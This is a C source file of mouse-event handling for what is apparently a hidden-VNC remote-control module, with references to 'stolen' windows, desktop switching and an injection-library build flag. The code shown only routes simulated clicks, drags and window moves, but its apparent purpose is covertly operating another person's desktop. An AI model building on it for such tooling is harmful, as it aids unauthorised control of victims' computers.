#include "..\includes.h"
#include "taskswitcher.h"
#include "kbd.h"
#include "windows.h"
#include "events.h"
#include "vnc.h"
#include "wnd_steal.h"

DWORD dwDoubleClickTime;

HWND ChangeMouseCapture(PHVNC lpServer,DWORD dwThreadID,HWND hNewWnd,WORD wNewArea,bool bPost)
{
    HWND hOldWnd;
    g_enter(hInputMutex)
    {
        hOldWnd=lpServer->lpGlobalVNCData->hCapturedWnd;
        lpServer->lpGlobalVNCData->dwCapturedThreadID=dwThreadID;
        lpServer->lpGlobalVNCData->hCapturedWnd=hNewWnd;
        lpServer->lpGlobalVNCData->wCapturedArea=wNewArea;
    }
    g_leave(hInputMutex)

    if (IsWindowEx(lpServer,hOldWnd))
    {
        if (bPost)
            PostMessage(hOldWnd,WM_CAPTURECHANGED,0,(LPARAM)hNewWnd);
        else
            SendMessage(hOldWnd,WM_CAPTURECHANGED,0,(LPARAM)hNewWnd);
    }

    return hOldWnd;
}

#ifndef _INJLIB
void MoveCapturedWindow(PHVNC lpServer,LONG dwX,LONG dwY,bool bFinal)
{
    HWND hWnd=lpServer->lpGlobalVNCData->hCapturedWnd,hParent=GetParent(hWnd);;
    WORD wArea=lpServer->lpGlobalVNCData->wCapturedArea;
    bool bMovingOrResizing=true,bChild=(GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD);
    RECT rect;
    memcpy(&rect,&lpServer->MouStateInfo.rcMovingWnd,sizeof(rect));
    if (bChild)
    {
        POINT pt={dwX,dwY};
        ScreenToClient(hParent,&pt);
        dwX=pt.x;
        dwY=pt.y;

        MapWindowPoints(NULL,hParent,(POINT *)&rect,sizeof(RECT)/sizeof(POINT));
    }
    switch (wArea)
    {
        case HTCAPTION:
        {
            if (bChild)
            {
                POINT pt={lpServer->lpGlobalVNCData->ptCursor.x,lpServer->lpGlobalVNCData->ptCursor.y};
                ScreenToClient(hParent,&pt);
                dwX-=pt.x;
                dwY-=pt.y;
            }
            else
            {
                dwX-=lpServer->lpGlobalVNCData->ptCursor.x;
                dwY-=lpServer->lpGlobalVNCData->ptCursor.y;
            }
            rect.left+=dwX;
            rect.right+=dwX;

            rect.top+=dwY;
            rect.bottom+=dwY;
            break;
        }
        case HTLEFT:
        {
            rect.left=dwX;
            break;
        }
        case HTTOP:
        {
            rect.top=dwY;
            break;
        }
        case HTRIGHT:
        {
            rect.right=dwX;
            break;
        }
        case HTBOTTOM:
        {
            rect.bottom=dwY;
            break;
        }
        case HTTOPLEFT:
        {
            rect.top=dwY;
            rect.left=dwX;
            break;
        }
        case HTTOPRIGHT:
        {
            rect.top=dwY;
            rect.right=dwX;
            break;
        }
        case HTBOTTOMLEFT:
        {
            rect.bottom=dwY;
            rect.left=dwX;
            break;
        }
        case HTGROWBOX:
        case HTBOTTOMRIGHT:
        {
            rect.bottom=dwY;
            rect.right=dwX;
            break;
        }
        default:
        {
            GetWindowRect(hWnd,&rect);
            bMovingOrResizing=false;
        }
    }

    if (!IsRectEmpty(&rect))
    {
        if ((bFinal) || (!bMovingOrResizing))
            SetWindowPos(hWnd,NULL,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,SWP_ASYNCWINDOWPOS+SWP_DEFERERASE+SWP_NOCOPYBITS+SWP_NOOWNERZORDER+SWP_NOREDRAW+SWP_NOZORDER);
        else
        {
            if (bChild)
                MapWindowPoints(hParent,NULL,(POINT *)&rect,sizeof(RECT)/sizeof(POINT));
            memcpy(&lpServer->MouStateInfo.rcMovingWnd,&rect,sizeof(rect));
        }
    }
    return;
}

DWORD CheckForDoubleClick(PHVNC lpServer,HWND hWnd,DWORD uMsg,LPARAM dwPoints)
{
    DWORD dwDoubleClickMessage=0;
    bool bNC=false;
    POINT pt={LOWORD(dwPoints),HIWORD(dwPoints)};

    switch (uMsg)
    {
        case WM_NCLBUTTONDOWN:
        {
            dwDoubleClickMessage=WM_NCLBUTTONDBLCLK;
            bNC=true;
            break;
        }
        case WM_NCMBUTTONDOWN:
        {
            dwDoubleClickMessage=WM_NCMBUTTONDBLCLK;
            bNC=true;
            break;
        }
        case WM_NCRBUTTONDOWN:
        {
            dwDoubleClickMessage=WM_NCRBUTTONDBLCLK;
            bNC=true;
            break;
        }
        case WM_LBUTTONDOWN:
        {
            dwDoubleClickMessage=WM_LBUTTONDBLCLK;
            break;
        }
        case WM_MBUTTONDOWN:
        {
            dwDoubleClickMessage=WM_MBUTTONDBLCLK;
            break;
        }
        case WM_RBUTTONDOWN:
        {
            dwDoubleClickMessage=WM_RBUTTONDBLCLK;
            break;
        }
    }

    if (dwDoubleClickMessage)
    {
        DWORD dwTimeOfMessage=GetTickCount();

        int ptX=pt.x-lpServer->MouStateInfo.ptLastDownPoints.x,
            ptY=pt.y-lpServer->MouStateInfo.ptLastDownPoints.y;

        if (ptX < 0)
            ptX*=-1;
        if (ptY < 0)
            ptY*=-1;

        if ((lpServer->MouStateInfo.hLastDownWindow == hWnd) && (lpServer->MouStateInfo.dwLastDownMessage == uMsg) &&
            ((dwTimeOfMessage-lpServer->MouStateInfo.dwLastDownTime) <= dwDoubleClickTime) && ((bNC) || (GetClassLongPtr(hWnd,GCL_STYLE) & CS_DBLCLKS)) &&
            ((ptX <= 2) && (ptY <= 2)))
        {
            lpServer->MouStateInfo.ptLastDownPoints.x=0;
            lpServer->MouStateInfo.ptLastDownPoints.y=0;
            lpServer->MouStateInfo.dwLastDownMessage=0;
            lpServer->MouStateInfo.dwLastDownTime=0;
            lpServer->MouStateInfo.hLastDownWindow=NULL;
            return dwDoubleClickMessage;
        }

        lpServer->MouStateInfo.dwLastDownMessage=uMsg;
        lpServer->MouStateInfo.dwLastDownTime=dwTimeOfMessage;
        lpServer->MouStateInfo.hLastDownWindow=hWnd;
        lpServer->MouStateInfo.ptLastDownPoints=pt;
    }
    return uMsg;
}

bool IsMenuEx(PHVNC lpServer,HWND hWnd)
{
    return (((GetWindowLongPtr(hWnd,GWL_EXSTYLE) & WS_EX_TOOLWINDOW) && (GetWindowLongPtr(hWnd,GWL_STYLE) & WS_CHILD)) || (GetWindowClassFlags(lpServer,hWnd) & WCF_MENU));
}

void MouseEvent(PHVNC lpServer,HWND hWnd,WINDOWINFO *wiInfo,WORD wHitTest,DWORD uMsg,DWORD ncMessage,LPARAM dwClientCursorPos,LPARAM dwScreenCursorPos)
{
    HWND hWndParent=GetAncestor(hWnd,GA_ROOT),
         hPopUp=GetTopPopupWindow(lpServer,hWndParent),
         hTopLevel=NULL;

    if (IsMDI(hWnd))
        hWndParent=hWnd;

    if ((uMsg == WM_LBUTTONDOWN) || (uMsg == WM_MBUTTONDOWN) || (uMsg == WM_RBUTTONDOWN))
    {
        lpServer->lpGlobalVNCData->bTrayIconUnderCursor=false;

        if ((hWnd == lpServer->WndsInfo.hTrayUserNotifyToolbarWnd) || (hWnd == lpServer->WndsInfo.hTraySystemNotifyToolbarWnd) || (hWnd == lpServer->WndsInfo.hTrayUserNotifyOverflowToolbarWnd))
        {
            if (SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_TBHITTEST,dwClientCursorPos) >= 0)
                lpServer->lpGlobalVNCData->bTrayIconUnderCursor=true;
        }

        if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
        {
            DestroyTaskSwitcherWnd(lpServer,false);
            return;
        }
        HWND hMenu=NULL;
        if (IsMenuEx(lpServer,hWnd))
            hMenu=hWnd;
        else if (IsMenuEx(lpServer,hWndParent))
            hMenu=hWndParent;
        DestroyMenus(lpServer,hMenu);

        if ((!bXP) && (hWnd == lpServer->WndsInfo.hTrayWnd))
        {
            SetForegroundWnd(lpServer,hWnd);
            hWnd=lpServer->WndsInfo.hStartBtnWnd;
            SetForegroundWnd(lpServer,hWnd);
        }

        WPARAM wParam=0;
        if (uMsg == WM_LBUTTONDOWN)
            wParam=VMW_TBLCLICK;
        else if (uMsg == WM_RBUTTONDOWN)
            wParam=VMW_TBRCLICK;

        if ((hWnd == lpServer->WndsInfo.hToolBarWnd) && (wParam))
            PostMessage(lpServer->WndsInfo.hToolBarWnd,lpServer->lpGlobalVNCData->dwVNCMessage,wParam,dwClientCursorPos);

        hTopLevel=lpServer->MouStateInfo.hLastTopLevelWindow;
        if ((bXP) || ((hTopLevel != lpServer->WndsInfo.hTrayWnd) && (hTopLevel != lpServer->WndsInfo.hStartBtnWnd)))
            hTopLevel=lpServer->lpGlobalVNCData->hForegroundWnd;

        if ((hWndParent != hTopLevel) && (!(GetWindowClassFlags(lpServer,hWndParent) & WCF_NO_CAPTURE)))
        {
            if (hPopUp)
            {
                hWnd=hPopUp;
                hWndParent=GetAncestor(hWnd,GA_ROOT);
            }

            if (IsStolenWindow(lpServer,hWnd))
            {
                SetFrgWnd(lpServer,hWnd);
                lpServer->lpGlobalVNCData->hForegroundWnd=hWnd;
            }
            else
                SetForegroundWnd(lpServer,hWndParent);

            DWORD_PTR dwResult;
            if ((SendMessageTimeout(hWnd,WM_MOUSEACTIVATE,(WPARAM)hWndParent,MAKELPARAM(wHitTest,uMsg),SMTO_ABORTIFHUNG+SMTO_NORMAL,100,&dwResult)) && ((dwResult == MA_ACTIVATEANDEAT) || (dwResult == MA_NOACTIVATEANDEAT)))
                return;

            if (!bXP)
                lpServer->MouStateInfo.hLastTopLevelWindow=hWndParent;
        }
    }

    if (hPopUp)
        return;

    PostMessage(hWnd,WM_SETCURSOR,(WPARAM)hWnd,MAKELPARAM(wHitTest,uMsg));

    if (wHitTest == HTCLIENT)
    {
        PostMessage(hWnd,CheckForDoubleClick(lpServer,hWnd,uMsg,dwScreenCursorPos),UpdateInputState(lpServer,0,false),dwClientCursorPos);
        return;
    }

    ncMessage=CheckForDoubleClick(lpServer,hWnd,ncMessage,dwScreenCursorPos);
    WORD wCommand=0;
    switch (wHitTest)
    {
        case HTSYSMENU:
        {
            if (ncMessage == WM_NCLBUTTONDBLCLK)
            {
                HMENU hMenu=GetSystemMenu(hWnd,false);
                if (hMenu)
                {
                    wCommand=GetMenuDefaultItem(hMenu,false,GMDI_GOINTOPOPUPS);
                    if (wCommand != -1)
                    {
                        MENUITEMINFO miiInfo;
                        miiInfo.cbSize=sizeof(miiInfo);
                        miiInfo.fMask=MIIM_STATE;
                        if (GetMenuItemInfo(hMenu,wCommand,MF_BYCOMMAND,&miiInfo))
                        {
                            if (miiInfo.fState & MFS_GRAYED)
                                wCommand=0;
                        }
                    }
                    else
                        wCommand=0;
                }
            }
            else if (ncMessage == WM_NCRBUTTONUP)
                wCommand=0xFFFF;
            break;
        }
        case HTMINBUTTON:
        {
            if (ncMessage == WM_NCLBUTTONUP)
            {
                if (wiInfo->dwStyle & WS_MINIMIZEBOX)
                    wCommand=SC_MINIMIZE;
            }
            else if (ncMessage == WM_NCRBUTTONUP)
                wCommand=0xFFFF;
            break;
        }
        case HTMAXBUTTON:
        {
            if (ncMessage == WM_NCLBUTTONUP)
            {
                if (wiInfo->dwStyle & WS_MAXIMIZEBOX)
                    wCommand=(wiInfo->dwStyle & WS_MAXIMIZE) ? SC_RESTORE:SC_MAXIMIZE;
            }
            else if (ncMessage == WM_NCRBUTTONUP)
                wCommand=0xFFFF;
            break;
        }
        case HTCLOSE:
        {
            if (ncMessage == WM_NCLBUTTONUP)
                wCommand=SC_CLOSE;
            else if (ncMessage == WM_NCRBUTTONUP)
                wCommand=0xFFFF;
            break;
        }
        case HTHELP:
        {
            if (ncMessage == WM_NCLBUTTONUP)
                wCommand=SC_CONTEXTHELP;
            else if (ncMessage == WM_NCRBUTTONUP)
                wCommand=0xFFFF;
            break;
        }
        case HTVSCROLL:
        case HTHSCROLL:
        {
            if (ncMessage == WM_NCRBUTTONUP)
            {
                wCommand=0xFFFF;
                break;
            }
            else if (ncMessage == WM_NCLBUTTONDOWN)
                ChangeMouseCapture(lpServer,GetWindowThreadProcessId(hWnd,NULL),hWnd,HTNOWHERE,true);
            goto postMessage;
        }
        case HTMENU:
        {
            if (ncMessage == WM_NCLBUTTONDOWN)
            {
                PostMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_EXECUTE_MENU,0);
                break;
            }
            else if (ncMessage == WM_NCMOUSEMOVE)
            {
                PostMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_HILITE_MENU,0);
                break;
            }
        }
        case HTCAPTION:
        {
            if (ncMessage == WM_NCLBUTTONDBLCLK)
                goto postMessage;
            else if (ncMessage == WM_NCRBUTTONUP)
                wCommand=0xFFFF;
            else if (ncMessage == WM_NCLBUTTONDOWN)
				ChangeMouseCapture(lpServer,GetWindowThreadProcessId(hWnd,NULL),hWnd,wHitTest,true);
            break;
        }
		case HTLEFT:
		case HTRIGHT:
		case HTTOP:
		case HTTOPLEFT:
		case HTTOPRIGHT:
		case HTBOTTOM:
		case HTBOTTOMLEFT:
		case HTBOTTOMRIGHT:
        {
            if (ncMessage == WM_NCLBUTTONDOWN)
                ChangeMouseCapture(lpServer,GetWindowThreadProcessId(hWnd,NULL),hWnd,wHitTest,true);
            break;
        }
        default:
postMessage:
        {
            PostMessage(hWnd,ncMessage,wHitTest,dwScreenCursorPos);
            break;
        }
    }

    if (wCommand)
    {
        if (wCommand == 0xFFFF)
            PostMessage(hWnd,WM_CONTEXTMENU,(WPARAM)hWnd,dwScreenCursorPos);
        else
            PostMessage(hWnd,WM_SYSCOMMAND,wCommand,dwScreenCursorPos);
    }
    return;
}

void ProcessMouMsg(PHVNC lpServer,DWORD dwFlags,LONG dwX,LONG dwY,DWORD dwData)
{
    WORD wOldInputState;
    HWND hCapturedWnd=NULL;
    if (lpServer->lpGlobalVNCData->wCapturedArea != HTNOWHERE)
    {
        if (dwFlags & MOUSEEVENTF_MOVE)
        {
            if (!lpServer->MouStateInfo.bMoving)
            {
                GetWindowRect(lpServer->lpGlobalVNCData->hCapturedWnd,&lpServer->MouStateInfo.rcMovingWnd);
                lpServer->MouStateInfo.bMoving=true;
            }
            MoveCapturedWindow(lpServer,dwX,dwY,false);
            dwFlags&=~MOUSEEVENTF_MOVE;
        }
        if (dwFlags & MOUSEEVENTF_LEFTUP)
        {
            if (lpServer->MouStateInfo.bMoving)
            {
                MoveCapturedWindow(lpServer,dwX,dwY,true);
                lpServer->MouStateInfo.bMoving=false;
            }
            ChangeMouseCapture(lpServer,0,NULL,HTNOWHERE,true);
        }
    }
    else
    {
        if (lpServer->MouStateInfo.bMoving)
        {
            MoveCapturedWindow(lpServer,dwX,dwY,true);
            lpServer->MouStateInfo.bMoving=false;
        }
        hCapturedWnd=lpServer->lpGlobalVNCData->hCapturedWnd;
        wOldInputState=(!hCapturedWnd) ? 0:UpdateInputState(lpServer,0,false);
    }

    g_enter(hInputMutex)
    {
        lpServer->lpGlobalVNCData->ptCursor.x=dwX;
        lpServer->lpGlobalVNCData->ptCursor.y=dwY;
    }
    g_leave(hInputMutex)

    if (dwFlags)
    {
        DWORD bLDown=dwFlags & MOUSEEVENTF_LEFTDOWN,
              bLUp=dwFlags & MOUSEEVENTF_LEFTUP;
        if (bLDown)
            UpdateInputState(lpServer,VK_LBUTTON,true);
        else if (bLUp)
            UpdateInputState(lpServer,VK_LBUTTON,false);

        DWORD bMDown=dwFlags & MOUSEEVENTF_MIDDLEDOWN,
              bMUp=dwFlags & MOUSEEVENTF_MIDDLEUP;
        if (bMDown)
            UpdateInputState(lpServer,VK_MBUTTON,true);
        else if (bMUp)
            UpdateInputState(lpServer,VK_MBUTTON,false);

        DWORD bRDown=dwFlags & MOUSEEVENTF_RIGHTDOWN,
              bRUp=dwFlags & MOUSEEVENTF_RIGHTUP;
        if (bRDown)
            UpdateInputState(lpServer,VK_RBUTTON,true);
        else if (bRUp)
            UpdateInputState(lpServer,VK_RBUTTON,false);

        WORD wHitTest;
        HWND hWnd=_WindowFromPoint(lpServer,lpServer->lpGlobalVNCData->ptCursor,&wHitTest);

        ///HDESK hPrevDesk=NULL;
        ///if (IsStolenWindow(lpServer,hWnd))
        ///    hPrevDesk=SwitchThreadToStolenWindowDesktop(hWnd);

        if ((wHitTest >= HTSIZEFIRST) && (wHitTest <= HTSIZELAST))
        {
            LONG_PTR dwStyle=GetWindowLongPtr(hWnd,GWL_STYLE);
            if ((dwStyle & WS_CHILD) && (!IsStyleHaveSizeBorders(dwStyle)))
            {
                HWND hParent=GetParent(hWnd);
                if (hParent)
                    hWnd=hParent;
            }
        }

        if ((hWnd) && (GetWindowClassFlags(lpServer,hWnd) & WCF_MOUSE_AUTOCAPTURE) && (!lpServer->MouStateInfo.bMoving))
        {
            if (hWnd != hCapturedWnd)
                ChangeMouseCapture(lpServer,GetWindowThreadProcessId(hWnd,NULL),hWnd,HTNOWHERE,true);
            wHitTest=HTCLIENT;
        }
        else if (hCapturedWnd)
        {
            if (IsWindowEx(lpServer,hCapturedWnd) && ((!hWnd) || (hCapturedWnd == hWnd) || (wOldInputState & (VK_LBUTTON+VK_MBUTTON+VK_RBUTTON))))
            {
                hWnd=hCapturedWnd;
                ///wHitTest=HTCLIENT;
            }
            else if (dwFlags != (MOUSEEVENTF_ABSOLUTE+MOUSEEVENTF_MOVE))
                ChangeMouseCapture(lpServer,0,NULL,HTNOWHERE,true);
        }

        if (hWnd)
        {
            HDESK hPrevDesk;
            if (IsStolenWindow(lpServer,hWnd))
                hPrevDesk=SwitchThreadToStolenWindowDesktop(hWnd);

            WINDOWINFO wiInfo;
            wiInfo.cbSize=sizeof(WINDOWINFO);

            if (GetWindowInfo(hWnd,&wiInfo))
            {
                LPARAM dwScreenCursorPos=MAKELPARAM(dwX,dwY),dwClientCursorPos;

                if (wHitTest == HTCLIENT)
                {
                    if (GetWindowClassFlags(lpServer,hWnd) & WCF_MOUSE_CLIENT_TO_SCREEN)
                        dwClientCursorPos=dwScreenCursorPos;
                    else
                        dwClientCursorPos=MAKELPARAM(dwX-wiInfo.rcClient.left,dwY-wiInfo.rcClient.top);
                }

                SendMessage(hWnd,lpServer->lpGlobalVNCData->dwVNCMessage,VMW_UPDATE_KEYSTATE,0);

                if (bLDown)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_LBUTTONDOWN,WM_NCLBUTTONDOWN,dwClientCursorPos,dwScreenCursorPos);
                else if (bLUp)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_LBUTTONUP,WM_NCLBUTTONUP, dwClientCursorPos,dwScreenCursorPos);

                if (bMDown)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_MBUTTONDOWN,WM_NCMBUTTONDOWN,dwClientCursorPos,dwScreenCursorPos);
                else if (bMUp)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_MBUTTONUP,WM_NCMBUTTONUP,dwClientCursorPos,dwScreenCursorPos);

                if (bRDown)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_RBUTTONDOWN,WM_NCRBUTTONDOWN,dwClientCursorPos,dwScreenCursorPos);
                else if (bRUp)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_RBUTTONUP,WM_NCRBUTTONUP,dwClientCursorPos,dwScreenCursorPos);

                if (dwFlags & MOUSEEVENTF_MOVE)
                    MouseEvent(lpServer,hWnd,&wiInfo,wHitTest,WM_MOUSEMOVE,WM_NCMOUSEMOVE,dwClientCursorPos,dwScreenCursorPos);

                if (dwFlags & MOUSEEVENTF_WHEEL)
                {
                    WORD wState=UpdateInputState(lpServer,0,false);
                    HWND hOurWnd=GetWindowFocus(lpServer->lpGlobalVNCData->hForegroundWnd);
                    if (!hOurWnd)
                        hOurWnd=hWnd;
                    PostMessage(hOurWnd,WM_MOUSEWHEEL,MAKEWPARAM(wState,dwData),dwScreenCursorPos);
                }
            }

            if (IsStolenWindow(lpServer,hWnd))
                SetThreadDesktopEx(hPrevDesk);
        }

        ///if (hPrevDesk)
        ///    SetThreadDesktop(hPrevDesk);
    }
    return;
}
#endif
